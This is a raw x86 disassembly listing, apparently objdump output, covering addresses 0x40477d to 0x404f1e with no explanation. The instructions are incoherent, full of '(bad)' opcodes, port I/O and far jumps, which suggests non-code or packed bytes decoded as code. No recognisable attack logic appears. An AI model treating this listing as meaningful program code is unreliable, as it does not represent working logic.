  40477d:	lds    ebp,FWORD PTR [eax+ebx*1]
  404780:	sbb    BYTE PTR [edx-0x22],bl
  404783:	mov    al,0xc7
  404785:	push   cs
  404786:	and    ah,BYTE PTR [ecx+0x43]
  404789:	and    BYTE PTR [ebx],ch
  40478b:	mov    ds:0xab797ea8,al
  404790:	xlat   BYTE PTR ds:[ebx]
  404791:	push   ds
  404792:	sar    BYTE PTR [edi-0x4e],cl
  404795:	retf   
  404796:	scas   al,BYTE PTR es:[edi]
  404797:	inc    ebp
  404798:	jb     0x404796
  40479a:	cmp    DWORD PTR [eax+0x7a9f2f40],esp
  4047a0:	in     al,dx
  4047a1:	shl    al,0x26
  4047a4:	int    0x36
  4047a6:	fwait
  4047a7:	xchg   ebx,eax
  4047a8:	adc    cl,BYTE PTR [edx]
  4047aa:	out    dx,eax
  4047ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4047ac:	jle    0x40477a
  4047ae:	push   esi
  4047af:	in     eax,dx
  4047b0:	sti    
  4047b1:	(bad)  
  4047b2:	jae    0x4047e4
  4047b4:	pushf  
  4047b5:	popa   
  4047b6:	inc    ebx
  4047b7:	or     al,0x1f
  4047b9:	ins    BYTE PTR es:[edi],dx
  4047ba:	retf   0x74c3
  4047bd:	push   ecx
  4047be:	pop    ss
  4047bf:	pop    eax
  4047c0:	jbe    0x4047fb
  4047c2:	fisub  WORD PTR ds:0x29529334
  4047c8:	xor    al,0xe
  4047ca:	mov    dl,0x5b
  4047cc:	shl    DWORD PTR [esp+edi*1+0x5a07140f],cl
  4047d3:	dec    edx
  4047d4:	dec    ecx
  4047d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4047d6:	xor    DWORD PTR [esi-0x2c],ebx
  4047d9:	aad    0x2
  4047db:	inc    ebx
  4047dc:	ss gs dec esi
  4047df:	dec    eax
  4047e0:	push   cs
  4047e1:	inc    edi
  4047e2:	dec    edi
  4047e3:	test   eax,0x2f92a646
  4047e8:	push   es
  4047e9:	dec    ebp
  4047ea:	pusha  
  4047eb:	in     eax,0x8
  4047ed:	jbe    0x4047c8
  4047ef:	mov    cl,0x8d
  4047f1:	mov    ecx,0x400b9b4c
  4047f6:	jbe    0x404805
  4047f8:	cdq    
  4047f9:	mov    dl,0xe7
  4047fb:	sbb    eax,0xa0ed696a
  404800:	in     al,0x32
  404802:	adc    DWORD PTR [ecx],ecx
  404804:	pop    es
  404805:	mov    ebp,0xac24983f
  40480a:	js     0x4047ed
  40480c:	pop    ecx
  40480d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40480e:	jnp    0x4047a6
  404810:	ins    BYTE PTR es:[edi],dx
  404811:	cmp    eax,0xeaa3e357
  404816:	dec    esp
  404817:	push   0x2f194f23
  40481c:	inc    edx
  40481d:	add    esi,DWORD PTR [ecx-0x1d8f4263]
  404823:	xor    eax,0x325b2435
  404828:	mov    al,0x3a
  40482a:	cmp    ah,BYTE PTR [edx-0x6a1bc20d]
  404830:	push   esp
  404831:	ins    BYTE PTR es:[edi],dx
  404832:	sub    esi,DWORD PTR [esi]
  404834:	clc    
  404835:	out    0x4a,eax
  404837:	cmp    eax,0xa6972661
  40483c:	add    DWORD PTR ds:0xbcfb4b46,ebx
  404842:	or     ch,dh
  404844:	jno    0x4048c5
  404846:	jns    0x4047d9
  404848:	jbe    0x4048b9
  40484a:	stos   BYTE PTR es:[edi],al
  40484b:	pop    ds
  40484c:	jmp    DWORD PTR [bx+di-0x5a81]
  404851:	dec    ecx
  404852:	in     eax,dx
  404853:	push   edx
  404854:	and    BYTE PTR [edx-0x17],bh
  404857:	or     BYTE PTR [ecx+0x5288ec0a],bh
  40485d:	stos   DWORD PTR es:[edi],eax
  40485e:	adc    BYTE PTR [eax-0x54],0x3
  404862:	cmp    al,0xbe
  404864:	inc    ebp
  404865:	jns    0x4047f8
  404867:	and    cl,bh
  404869:	sbb    al,0xef
  40486b:	jge    0x40486a
  40486d:	repnz (bad) 
  40486f:	xor    eax,0xa8190ee8
  404874:	dec    edi
  404875:	(bad)  
  404876:	cmp    edx,ebp
  404878:	test   al,0xd3
  40487a:	inc    edx
  40487b:	lahf   
  40487c:	sub    eax,0x15e7f71b
  404881:	sbb    bl,bl
  404883:	ficom  WORD PTR [ebp-0x80]
  404886:	jmp    0x4048c3
  404888:	test   eax,edx
  40488a:	mov    dl,0xd8
  40488c:	adc    DWORD PTR [ecx],ecx
  40488e:	lahf   
  40488f:	add    BYTE PTR [eax+0x2f],dl
  404892:	pop    es
  404893:	imul   eax,DWORD PTR [esi],0x5adf11c
  404899:	inc    eax
  40489a:	and    esi,DWORD PTR [eax+ebp*8-0x4adca270]
  4048a1:	adc    edx,DWORD PTR [ebx]
  4048a3:	dec    eax
  4048a4:	test   eax,0x85d7f34c
  4048a9:	imul   ebp,DWORD PTR [edx+0x66],0xffffffd8
  4048ad:	lods   al,BYTE PTR ds:[esi]
  4048ae:	ror    BYTE PTR [eax+edx*2+0xc6c806b],cl
  4048b5:	xor    al,0x6b
  4048b7:	pop    ebx
  4048b8:	stos   DWORD PTR es:[edi],eax
  4048b9:	mov    bh,0xe7
  4048bb:	cmp    BYTE PTR [esi+0x690aab64],dl
  4048c1:	xor    edi,esi
  4048c3:	or     al,0x16
  4048c5:	mov    ecx,0x4420f2db
  4048ca:	mov    WORD PTR [esi],es
  4048cc:	add    ebx,DWORD PTR [esi]
  4048ce:	cmc    
  4048cf:	fs enter 0x8080,0xf
  4048d4:	lods   eax,DWORD PTR ds:[esi]
  4048d5:	fld    TBYTE PTR [ebp+ecx*8-0x489f0ac1]
  4048dc:	xor    eax,DWORD PTR [edx+0xfa0bc2e]
  4048e2:	mov    BYTE PTR [ebx+0x5e],ah
  4048e5:	cli    
  4048e6:	icebp  
  4048e7:	repz jb 0x404957
  4048ea:	sbb    ecx,DWORD PTR ds:0x366a397f
  4048f0:	and    bl,BYTE PTR ds:0x8c70302
  4048f6:	and    al,0x6
  4048f8:	xchg   edi,eax
  4048f9:	into   
  4048fa:	sub    ecx,ecx
  4048fc:	sub    eax,edx
  4048fe:	sahf   
  4048ff:	dec    ebp
  404900:	test   al,0xfa
  404902:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404904:	pusha  
  404905:	scas   eax,DWORD PTR es:[edi]
  404906:	(bad)  
  404908:	cmp    DWORD PTR [ebp-0x7bdaad3],edi
  40490e:	lock mov BYTE PTR [eax+0x28],dh
  404912:	pop    es
  404913:	pop    es
  404914:	sub    eax,0x8fbc177c
  404919:	pop    ebp
  40491a:	inc    ebp
  40491b:	dec    esi
  40491c:	dec    esi
  40491d:	in     eax,dx
  40491e:	mov    cl,0x2f
  404920:	fwait
  404921:	daa    
  404922:	pusha  
  404923:	daa    
  404924:	in     al,dx
  404925:	mov    eax,0x8182c268
  40492a:	push   ebp
  40492b:	idiv   BYTE PTR [edx]
  40492d:	leave  
  40492e:	cmp    edx,0x43
  404931:	cdq    
  404932:	and    al,BYTE PTR [ecx+ebx*8-0xcc3c719]
  404939:	lahf   
  40493a:	sbb    ebp,0xf32d853
  404940:	in     eax,0x94
  404942:	call   0x186d:0xe39821b5
  404949:	lods   eax,DWORD PTR ds:[esi]
  40494a:	or     BYTE PTR [ebp+edx*4+0x62f0c916],ch
  404951:	daa    
  404952:	call   0x1d9c:0xe6c549b6
  404959:	jp     0x404977
  40495b:	dec    ebx
  40495c:	push   0xd8238291
  404961:	xchg   BYTE PTR [eax+0x122ad24d],cl
  404967:	adc    eax,ecx
  404969:	iret   
  40496a:	out    dx,al
  40496b:	(bad)  
  40496c:	cmp    edx,DWORD PTR [ebx]
  40496e:	push   0x98070b56
  404973:	out    0x86,al
  404975:	fcmovb st,st(1)
  404977:	mov    eax,0x4cee2450
  40497c:	dec    ecx
  40497d:	outs   dx,DWORD PTR ds:[esi]
  40497e:	hlt    
  40497f:	mov    edi,0x6131108f
  404984:	retf   
  404985:	ret    0xa8ef
  404988:	minps  xmm2,XMMWORD PTR [esi+ebp*2+0x1a44eec1]
  404990:	(bad)  
  404991:	xlat   BYTE PTR ds:[ebx]
  404992:	push   esi
  404993:	fmul   QWORD PTR [ebx+ebx*2-0x1a6920a6]
  40499a:	lods   al,BYTE PTR ds:[esi]
  40499b:	mov    ebx,0x75895219
  4049a0:	cwde   
  4049a1:	(bad)  
  4049a2:	jg     0x404a19
  4049a4:	xchg   esi,eax
  4049a5:	mov    fs,WORD PTR [esi+eax*2-0x58991545]
  4049ac:	cmp    dh,BYTE PTR [ebx]
  4049ae:	iret   
  4049af:	sti    
  4049b0:	cmc    
  4049b1:	fdivr  QWORD PTR [ecx-0x47]
  4049b4:	arpl   WORD PTR [eax-0x1a],ax
  4049b7:	xor    DWORD PTR [ebp-0x566930c1],0x5e
  4049be:	push   ds
  4049bf:	bound  edi,QWORD PTR [esi+0x4c2b9b14]
  4049c5:	mov    dl,0x7f
  4049c7:	shl    DWORD PTR gs:[eax+ebp*2+0x1],1
  4049cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4049cd:	les    ebx,FWORD PTR ds:0x6478b736
  4049d3:	push   edi
  4049d4:	lods   al,BYTE PTR ds:[esi]
  4049d5:	dec    eax
  4049d6:	mov    al,ds:0x5f6bb9bf
  4049db:	in     eax,dx
  4049dc:	sub    eax,0x5266ae26
  4049e1:	and    DWORD PTR [esi+0x69],esp
  4049e4:	fs jbe 0x404a31
  4049e7:	sbb    dh,BYTE PTR ds:0x804880c0
  4049ed:	ds or  ah,bh
  4049f0:	adc    edx,DWORD PTR [edx]
  4049f2:	inc    esi
  4049f3:	test   eax,0x720cc9bd
  4049f8:	fcomp  DWORD PTR [esi-0x762882da]
  4049fe:	retf   0x66e8
  404a01:	stc    
  404a02:	pop    esi
  404a03:	jmp    0x6f957e57
  404a08:	mov    dh,0x7a
  404a0a:	cmp    dl,BYTE PTR [edi+edx*2+0xa08b9ab]
  404a11:	push   edi
  404a12:	sbb    BYTE PTR [ebp-0x6f0b1cb6],0x4d
  404a19:	xchg   ebp,eax
  404a1a:	pop    ss
  404a1b:	push   esp
  404a1c:	pop    edi
  404a1d:	mov    al,ds:0xb22818af
  404a22:	repnz mov BYTE PTR [edx-0x69f3e245],0x9e
  404a2a:	imul   ecx,edi,0xffffffe8
  404a2d:	stc    
  404a2e:	mov    al,ds:0xa010e2e6
  404a33:	pop    ecx
  404a34:	retf   
  404a35:	leave  
  404a36:	pop    edi
  404a37:	iret   
  404a38:	shr    ch,0x6b
  404a3b:	cmp    al,0x65
  404a3d:	jmp    0x404a86
  404a3f:	out    0x5d,eax
  404a41:	cmp    DWORD PTR ds:0x42895a04,esi
  404a47:	ret    
  404a48:	mov    cl,0x39
  404a4a:	inc    edi
  404a4b:	cwde   
  404a4c:	jo     0x4049ff
  404a4e:	dec    esi
  404a4f:	mov    es,WORD PTR [ebp-0x7a2a7458]
  404a55:	(bad)  
  404a56:	ss dec esp
  404a58:	xchg   edx,eax
  404a59:	enter  0x8bce,0xb0
  404a5d:	aaa    
  404a5e:	out    dx,eax
  404a5f:	cmp    al,BYTE PTR [edi+0x265ce283]
  404a65:	or     ah,dl
  404a67:	jno    0x404a24
  404a69:	xchg   esi,eax
  404a6a:	shl    DWORD PTR [edx-0x63],cl
  404a6d:	sbb    edi,DWORD PTR [edi+0x6e8e89a3]
  404a73:	inc    esp
  404a74:	jl     0x404a1a
  404a76:	jb     0x404a00
  404a78:	shl    BYTE PTR [ecx-0x5e744568],1
  404a7e:	pop    ebx
  404a7f:	push   esp
  404a80:	adc    eax,0x581640a6
  404a85:	jle    0x404ad7
  404a87:	mov    al,0xdf
  404a89:	sbb    DWORD PTR [ecx-0x67],ecx
  404a8c:	in     eax,0x3c
  404a8e:	clc    
  404a8f:	or     bl,bh
  404a91:	clc    
  404a92:	(bad)  
  404a93:	mov    edi,esi
  404a95:	xchg   ebx,eax
  404a96:	pop    ecx
  404a97:	cmp    DWORD PTR [esi],edx
  404a99:	(bad)  
  404a9a:	add    BYTE PTR [ebx],bl
  404a9c:	call   0x13b4:0xa1cff7af
  404aa3:	popa   
  404aa4:	add    DWORD PTR [edi+ecx*2+0x3b],esp
  404aa8:	mov    ch,0x6b
  404aaa:	repz clc 
  404aac:	or     bh,BYTE PTR [ebp-0x7991c945]
  404ab2:	out    0x19,eax
  404ab4:	mov    bl,0xfb
  404ab6:	or     al,0x79
  404ab8:	or     DWORD PTR [edi-0x49],0x10993f0e
  404abf:	lea    ebp,[ebp+ecx*4+0x147d8675]
  404ac6:	xchg   edi,eax
  404ac7:	js     0x404ada
  404ac9:	cmp    ch,BYTE PTR [eax-0x80]
  404acc:	rol    ebp,cl
  404ace:	and    esi,DWORD PTR [eax-0x5c8d3de8]
  404ad4:	or     DWORD PTR [edx],ebp
  404ad6:	xchg   edx,eax
  404ad7:	xlat   BYTE PTR ds:[ebx]
  404ad8:	int3   
  404ad9:	jle    0x404adb
  404adb:	add    ecx,DWORD PTR [ecx-0xa34c84f]
  404ae1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404ae2:	mov    esi,0xd29aec0f
  404ae7:	fadd   QWORD PTR [ebp+esi*8-0x2a408f35]
  404aee:	adc    eax,0x6745decb
  404af3:	mov    esi,0xde448caa
  404af8:	les    ebp,FWORD PTR [ebx]
  404afa:	jl     0x404abc
  404afc:	das    
  404afd:	adc    eax,0xa489214b
  404b02:	das    
  404b03:	call   0x6b42:0xbe8ef332
  404b0a:	xor    edi,ebp
  404b0c:	mov    DWORD PTR [ebx+ebp*2-0x27865bb2],esi
  404b13:	pushf  
  404b14:	xor    al,0x36
  404b16:	loope  0x404b75
  404b18:	sub    ecx,DWORD PTR [ebp+0x41]
  404b1b:	sub    DWORD PTR [edi],0x8e14aff7
  404b21:	jmp    0x5340ae6e
  404b26:	sbb    eax,0x5e68673b
  404b2b:	jne    0x404ba5
  404b2d:	das    
  404b2e:	and    DWORD PTR [edi+0x28d5fb28],0x42
  404b35:	xor    dh,BYTE PTR [edx+ebp*1+0x2d]
  404b39:	mov    cl,BYTE PTR [ebx]
  404b3b:	inc    ebx
  404b3c:	iret   
  404b3d:	shl    DWORD PTR [ecx-0xecefa],0xae
  404b44:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404b45:	mov    ebp,DWORD PTR [edi]
  404b47:	(bad)  
  404b48:	or     eax,0x700a9ad6
  404b4d:	fnstenv [ebx+ecx*2]
  404b50:	push   ecx
  404b51:	lea    edx,gs:[edx]
  404b54:	rol    DWORD PTR [edx],1
  404b56:	and    BYTE PTR [esi-0x22b913f9],dh
  404b5c:	les    edx,FWORD PTR [eax]
  404b5e:	adc    edx,DWORD PTR [ecx-0x46accec5]
  404b64:	xlat   BYTE PTR ds:[ebx]
  404b65:	outs   dx,DWORD PTR ds:[esi]
  404b66:	sub    eax,0x8edc50ef
  404b6b:	sub    DWORD PTR gs:[edi+0x70],0x38
  404b70:	ror    DWORD PTR [esi],cl
  404b72:	sub    BYTE PTR [ebp-0x67353b09],al
  404b78:	xor    ch,dh
  404b7a:	mov    eax,ds:0xba93056a
  404b7f:	jp     0x404b32
  404b81:	fsub   st(2),st
  404b83:	fldlg2 
  404b85:	xchg   esp,eax
  404b86:	add    bl,dh
  404b88:	int    0xcb
  404b8a:	mov    bl,0x24
  404b8c:	xor    al,0x47
  404b8e:	lea    ebx,[esi+0x4e92e35f]
  404b94:	jl     0x404b45
  404b96:	shl    DWORD PTR [edx+0x6d8be0d5],0x83
  404b9d:	jle    0x404c18
  404b9f:	mov    bl,0x52
  404ba1:	js     0x404b27
  404ba3:	dec    ebx
  404ba4:	mov    al,ds:0xe6b794e7
  404ba9:	pushf  
  404baa:	arpl   WORD PTR gs:[ecx],cx
  404bad:	inc    esp
  404bae:	clc    
  404baf:	inc    esi
  404bb0:	ds stos DWORD PTR es:[edi],eax
  404bb2:	icebp  
  404bb3:	(bad)  
  404bb4:	add    eax,0x15fa0e86
  404bb9:	shl    DWORD PTR [edi+0x54edee63],1
  404bbf:	cs jle 0x404b94
  404bc2:	add    BYTE PTR [eax],ah
  404bc4:	addr16 push edi
  404bc6:	aad    0x92
  404bc8:	and    bh,BYTE PTR [esi]
  404bca:	jnp    0x404c39
  404bcc:	outs   dx,BYTE PTR ds:[esi]
  404bcd:	stc    
  404bce:	sar    ebx,1
  404bd0:	in     al,0xb9
  404bd2:	mul    ah
  404bd4:	jae    0x404bd6
  404bd6:	arpl   WORD PTR ds:0xdba0f4e6,ax
  404bdc:	popf   
  404bdd:	ss out dx,eax
  404bdf:	jge    0x404bb1
  404be1:	daa    
  404be2:	jle    0x404b83
  404be4:	push   edi
  404be5:	cdq    
  404be6:	fadd   st,st(0)
  404be8:	jmp    0x3960:0xfbf527fe
  404bef:	adc    ecx,esi
  404bf1:	mov    ds:0xd666e2d4,eax
  404bf6:	add    ecx,esi
  404bf8:	retf   
  404bf9:	push   ebp
  404bfa:	lds    eax,FWORD PTR [edi+0x55]
  404bfd:	(bad)  
  404bfe:	mov    ebx,0x3fd8e9f2
  404c03:	enter  0x5bcf,0xa9
  404c07:	or     eax,0x5fdfeac7
  404c0c:	hlt    
  404c0d:	imul   esi,DWORD PTR [ecx+0x60],0x55
  404c11:	and    al,0xa4
  404c14:	mov    DWORD PTR [eax+edi*4-0xfdbeac0],ecx
  404c1b:	out    0x81,al
  404c1d:	jmp    0x6887bb40
  404c22:	cmp    DWORD PTR [edi-0x14d65c7c],edi
  404c28:	daa    
  404c29:	jp     0x404ca6
  404c2b:	cmc    
  404c2c:	mov    ah,0xeb
  404c2e:	push   ds
  404c2f:	push   esp
  404c30:	jbe    0x404c92
  404c32:	lds    esp,FWORD PTR [esi+0x75b1602c]
  404c38:	loopne 0x404c88
  404c3a:	enter  0x327,0xc
  404c3e:	cli    
  404c3f:	push   eax
  404c40:	or     DWORD PTR [esp+0x11],edx
  404c44:	dec    esp
  404c45:	adc    al,0xa4
  404c47:	jmp    0x404c12
  404c49:	sbb    eax,0x96af84ab
  404c4e:	sub    ch,dl
  404c50:	call   0xe396:0xf907067d
  404c57:	pop    ebx
  404c58:	dec    esp
  404c59:	jecxz  0x404c47
  404c5b:	add    bl,ah
  404c5d:	(bad)  
  404c5e:	mov    dl,0x13
  404c60:	(bad)  
  404c61:	(bad)  
  404c62:	test   al,0x49
  404c64:	arpl   dx,dx
  404c66:	into   
  404c67:	sar    ecx,0xea
  404c6a:	fwait
  404c6b:	neg    ebp
  404c6d:	inc    edi
  404c6e:	xchg   edx,eax
  404c6f:	jae    0x404cad
  404c71:	xchg   ebp,eax
  404c72:	mov    ds:0x6ca02e9f,eax
  404c77:	leave  
  404c78:	and    DWORD PTR [eax+0x72c136f4],ebp
  404c7e:	sahf   
  404c7f:	mov    dl,0x38
  404c81:	dec    eax
  404c82:	sbb    esp,0x7e
  404c85:	data16 jnp 0x404c9f
  404c88:	cs (bad) 
  404c8a:	sar    bl,1
  404c8c:	enter  0x2665,0x58
  404c90:	jb     0x404cff
  404c92:	mov    dl,0x1d
  404c94:	jle    0x404cd0
  404c96:	in     eax,0xba
  404c98:	dec    edx
  404c99:	fld    QWORD PTR [esi]
  404c9b:	popf   
  404c9c:	add    eax,ebp
  404c9e:	mov    bh,0xf9
  404ca0:	adc    DWORD PTR [ecx-0x344e655],esi
  404ca6:	js     0x404cd1
  404ca8:	out    dx,eax
  404ca9:	mov    ah,0xcb
  404cab:	cs out 0x96,eax
  404cae:	test   eax,0xaee6a3fd
  404cb3:	stos   BYTE PTR es:[edi],al
  404cb4:	fwait
  404cb5:	les    esp,FWORD PTR [ebp+0x4c]
  404cb8:	pop    ss
  404cb9:	(bad)  
  404cba:	mov    ah,0x95
  404cbc:	xor    esp,ecx
  404cbe:	push   esp
  404cbf:	push   ds
  404cc0:	(bad)  
  404cc2:	cmp    esi,edx
  404cc4:	cdq    
  404cc5:	or     al,0xe2
  404cc7:	(bad)  
  404cc8:	int    0xbf
  404cca:	shl    BYTE PTR [ebx-0x1edabd97],1
  404cd0:	call   0xb557:0xbe7fe3b
  404cd7:	and    DWORD PTR [ebp-0x3be99186],eax
  404cdd:	xlat   BYTE PTR ds:[ebx]
  404cde:	fldpi  
  404ce0:	and    bl,bl
  404ce2:	lods   eax,DWORD PTR ds:[esi]
  404ce3:	imul   edi,DWORD PTR [ebx+0x2b3d08a6],0xc98928f7
  404ced:	dec    edx
  404cee:	fcmovnbe st,st(7)
  404cf0:	pop    esp
  404cf1:	ja     0x404cc1
  404cf3:	xor    BYTE PTR [esi-0x66],bl
  404cf6:	xchg   esp,eax
  404cf7:	and    BYTE PTR [edx+0x2b47d494],cl
  404cfd:	mov    eax,ds:0xa9eba2da
  404d02:	into   
  404d03:	sub    DWORD PTR [ecx],ebp
  404d05:	and    DWORD PTR [eax+0x1],esi
  404d08:	lea    esp,[ebp+0x1f2c13b4]
  404d0e:	push   cs
  404d0f:	scas   al,BYTE PTR es:[edi]
  404d10:	out    0xd3,al
  404d12:	xchg   edi,eax
  404d13:	xor    esi,0xffffffcc
  404d16:	mov    ch,0xe7
  404d18:	rcl    DWORD PTR [ecx],1
  404d1a:	push   ss
  404d1b:	fistp  QWORD PTR [edi]
  404d1d:	aaa    
  404d1e:	repz mov ecx,0x204d812e
  404d24:	xchg   edi,eax
  404d25:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404d26:	in     al,dx
  404d27:	jp     0x404d08
  404d29:	stos   DWORD PTR es:[edi],eax
  404d2a:	push   0x60
  404d2c:	sbb    ecx,DWORD PTR [edx]
  404d2e:	dec    ebx
  404d2f:	mov    ebx,0xeb3363aa
  404d34:	push   edx
  404d35:	iret   
  404d36:	cmp    edi,DWORD PTR [esi]
  404d38:	ins    BYTE PTR es:[edi],dx
  404d39:	popf   
  404d3a:	mov    eax,0x65dfd94a
  404d3f:	outs   dx,BYTE PTR ds:[esi]
  404d40:	dec    edx
  404d41:	dec    edx
  404d42:	xchg   edx,eax
  404d43:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404d44:	adc    ch,dl
  404d46:	mov    esp,0x1679502c
  404d4b:	ror    BYTE PTR [ebx],1
  404d4d:	hlt    
  404d4e:	mov    bl,0x53
  404d50:	stos   BYTE PTR es:[edi],al
  404d51:	std    
  404d52:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404d53:	fucom  st(4)
  404d55:	lods   al,BYTE PTR ds:[esi]
  404d56:	(bad)  
  404d57:	loope  0x404db6
  404d59:	sub    eax,DWORD PTR [eax-0x76f2d89f]
  404d5f:	into   
  404d60:	inc    eax
  404d61:	inc    ebx
  404d62:	aad    0x6
  404d64:	push   ecx
  404d65:	push   ss
  404d66:	out    dx,eax
  404d67:	inc    esi
  404d68:	mov    WORD PTR [ebx+0x35d9a63a],ss
  404d6e:	sub    esi,edi
  404d70:	sar    BYTE PTR [eax-0x16],1
  404d73:	inc    edi
  404d74:	sbb    ebp,DWORD PTR ds:0x6b0d9e65
  404d7a:	(bad)  
  404d7b:	daa    
  404d7c:	add    al,0x42
  404d7e:	cmp    BYTE PTR [ebx-0x3a],dh
  404d81:	hlt    
  404d82:	jne    0x404dcb
  404d84:	add    cl,ah
  404d86:	into   
  404d87:	sub    edi,DWORD PTR [ebp+0xd51e18a]
  404d8d:	call   0x9b98be32
  404d92:	jae    0x404d80
  404d94:	sbb    al,0x72
  404d96:	xor    DWORD PTR [ecx],edi
  404d98:	mov    ch,0x3e
  404d9a:	mov    al,0xad
  404d9c:	fs fadd st,st(4)
  404d9f:	push   cs
  404da0:	inc    ebp
  404da1:	mov    DWORD PTR [edi],esp
  404da3:	sub    ah,cl
  404da5:	scas   eax,DWORD PTR es:[edi]
  404da6:	hlt    
  404da7:	sub    edi,DWORD PTR [edi]
  404da9:	dec    edi
  404daa:	cmc    
  404dab:	pusha  
  404dac:	mov    ds:0xb6e85077,al
  404db1:	adc    edi,DWORD PTR [esi-0x3199e1fe]
  404db7:	and    esp,esp
  404db9:	cmp    DWORD PTR [ebx],ecx
  404dbb:	xchg   al,cl
  404dbd:	cmp    ah,BYTE PTR ds:0xdc43dd93
  404dc3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404dc4:	mov    esi,0x21499253
  404dc9:	xchg   ebx,eax
  404dca:	iret   
  404dcb:	sbb    DWORD PTR [ebx+0x39],0x54
  404dcf:	mov    cl,0x2b
  404dd1:	pop    ebx
  404dd2:	pop    edx
  404dd3:	mov    eax,ds:0x693b536b
  404dd8:	adc    DWORD PTR ds:0xb29cdafc,esp
  404dde:	xchg   esi,eax
  404ddf:	xchg   edi,eax
  404de0:	and    esi,DWORD PTR [ecx-0x7a]
  404de3:	inc    ebp
  404de4:	inc    edi
  404de5:	jmp    0x404dd3
  404de7:	(bad)  
  404de8:	xchg   edx,eax
  404de9:	mov    ebp,0x9c1774de
  404dee:	sub    al,0xb9
  404df0:	ins    DWORD PTR es:[edi],dx
  404df1:	add    ah,ah
  404df3:	add    al,0x6d
  404df5:	and    BYTE PTR [eax+0x3189c2ca],dl
  404dfb:	or     DWORD PTR [ebx],ebp
  404dfd:	mov    esi,0xe0ae0ccc
  404e02:	cmp    BYTE PTR [ebx+0x46],bh
  404e05:	pop    eax
  404e06:	mov    edx,DWORD PTR [ebp+0x3f3e6d7f]
  404e0c:	test   DWORD PTR [edi-0x20],ebx
  404e0f:	push   esi
  404e10:	bound  esp,QWORD PTR [esi]
  404e12:	mov    bl,0xed
  404e14:	mov    WORD PTR [ebx+0x3bf0720f],fs
  404e1a:	adc    edi,esi
  404e1c:	in     al,0xd
  404e1e:	stos   DWORD PTR es:[edi],eax
  404e1f:	jle    0x404e61
  404e21:	mov    ds:0xa0419b88,al
  404e27:	mov    dl,0xb8
  404e29:	inc    ecx
  404e2a:	mov    cl,0x64
  404e2c:	out    0x61,eax
  404e2e:	fisttp DWORD PTR [esi+ebp*4]
  404e31:	xchg   ebp,eax
  404e32:	push   esp
  404e33:	and    esp,DWORD PTR [eax+0x30]
  404e36:	mov    dl,0x83
  404e38:	push   esp
  404e39:	sub    BYTE PTR [ebx+0x76],cl
  404e3c:	out    0xcf,al
  404e3e:	and    al,0xce
  404e40:	mov    esi,0xee10a47a
  404e45:	ftst   
  404e47:	fdivr  QWORD PTR [edx+0x3cf1b44a]
  404e4d:	pop    esi
  404e4e:	mov    WORD PTR [eax-0x327dd22],?
  404e54:	mov    cl,0x1b
  404e56:	push   edi
  404e57:	(bad)  
  404e58:	mov    ah,0x46
  404e5a:	bound  eax,QWORD PTR [edi-0x41]
  404e5d:	ret    0xd5f5
  404e60:	scas   eax,DWORD PTR es:[edi]
  404e61:	test   ch,bl
  404e63:	jb     0x404e8a
  404e65:	outs   dx,DWORD PTR ds:[esi]
  404e66:	popf   
  404e67:	scas   eax,DWORD PTR es:[edi]
  404e68:	test   BYTE PTR [esp+ebp*8+0x17],ah
  404e6c:	popa   
  404e6d:	cdq    
  404e6e:	(bad)  
  404e6f:	sti    
  404e70:	scas   al,BYTE PTR es:[edi]
  404e71:	xor    BYTE PTR [eax],0xd7
  404e74:	pop    esp
  404e75:	add    edx,DWORD PTR [edx+0x5d]
  404e78:	mov    bl,0xfd
  404e7a:	sbb    esi,DWORD PTR [edx+0x75800e9a]
  404e80:	jne    0x404e29
  404e82:	dec    esi
  404e83:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404e84:	push   ebp
  404e85:	and    eax,0xc9f08a37
  404e8a:	scas   al,BYTE PTR es:[edi]
  404e8b:	and    BYTE PTR [eax+ecx*4-0x6bce476b],cl
  404e92:	dec    ebp
  404e93:	inc    ecx
  404e94:	sub    ebx,DWORD PTR [esi+eiz*2+0x4100b9aa]
  404e9b:	mov    ds:0xb0435b51,eax
  404ea0:	hlt    
  404ea1:	mov    ebp,0x9fd0e553
  404ea7:	in     eax,dx
  404ea8:	dec    esp
  404ea9:	sub    cl,BYTE PTR [ecx]
  404eab:	ss jbe 0x404e34
  404eae:	push   ebx
  404eaf:	mov    eax,esi
  404eb1:	ficomp WORD PTR [edx]
  404eb3:	and    al,0x42
  404eb5:	lahf   
  404eb6:	mov    ds:0x5e0ba9ae,eax
  404ebb:	inc    esp
  404ebc:	sbb    esp,DWORD PTR [edi]
  404ebe:	and    DWORD PTR [eax+0x18],ebx
  404ec1:	retf   
  404ec2:	sub    ch,bl
  404ec4:	(bad)  
  404ec5:	daa    
  404ec6:	adc    ch,dh
  404ec8:	ror    BYTE PTR [edx],0xec
  404ecb:	popf   
  404ecc:	jnp    0x404e83
  404ece:	test   BYTE PTR es:[eax-0x69],ah
  404ed2:	cwde   
  404ed3:	push   es
  404ed4:	aad    0x8e
  404ed6:	cld    
  404ed7:	cmp    al,0xa5
  404ed9:	xor    DWORD PTR [eax+ecx*8-0x8f26be2],ebp
  404ee0:	les    ebx,FWORD PTR [esi+0x2d1f31f0]
  404ee6:	mov    edx,0xfd729038
  404eeb:	xor    dl,ch
  404eed:	xchg   ebp,eax
  404eee:	add    eax,0x669294b
  404ef3:	test   al,0xaa
  404ef5:	aam    0x75
  404ef7:	push   ebx
  404ef8:	push   eax
  404ef9:	mov    eax,0x8caa6af8
  404efe:	and    bh,BYTE PTR [edi+ebp*8-0x76]
  404f02:	mov    ah,0xb7
  404f04:	jno    0x404ec1
  404f06:	cdq    
  404f07:	xor    esp,DWORD PTR [edx-0x7c032c83]
  404f0d:	fs pop ss
  404f0f:	mov    WORD PTR [edx-0xa],fs
  404f12:	data16 js 0x404f1e
  404f15:	xor    bl,ch
  404f17:	repz dec edx
  404f19:	push   cs
  404f1a:	dec    edi
  404f1b:	cmp    BYTE PTR [edi+0x2a],dl
  404f1e:	inc    ebp
